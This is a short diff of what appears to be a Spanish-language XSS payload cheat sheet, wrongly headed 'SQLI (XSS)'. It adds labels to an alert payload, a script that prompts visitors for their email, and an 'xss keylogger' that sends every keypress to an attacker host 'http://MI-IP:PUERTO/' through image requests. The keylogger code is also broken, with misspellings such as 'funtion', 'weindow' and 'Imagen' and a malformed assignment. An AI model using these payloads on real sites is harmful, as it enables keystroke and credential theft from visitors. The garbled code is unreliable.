@@ -9,10 +9,11 @@
 
 ### SQLI (XSS)
 
+xss
 ```python
 <script>alert("XSS")</script>
 ```
-
+xss
 ```python
 <script>
 var email= prompt("introduce tu correo");
@@ -25,11 +26,12 @@ if (email==null || email == ""){
 </script>
 ```
 
+xss keylogger
 ```python
 <script>
 	var k = "";
 	document.onkeypress = funtion(e){
-	e = e 
+	e = e weindow.event;
 	k += e.key
 	var i = new Imagen();
 	i.src = "http://MI-IP:PUERTO/" + k;
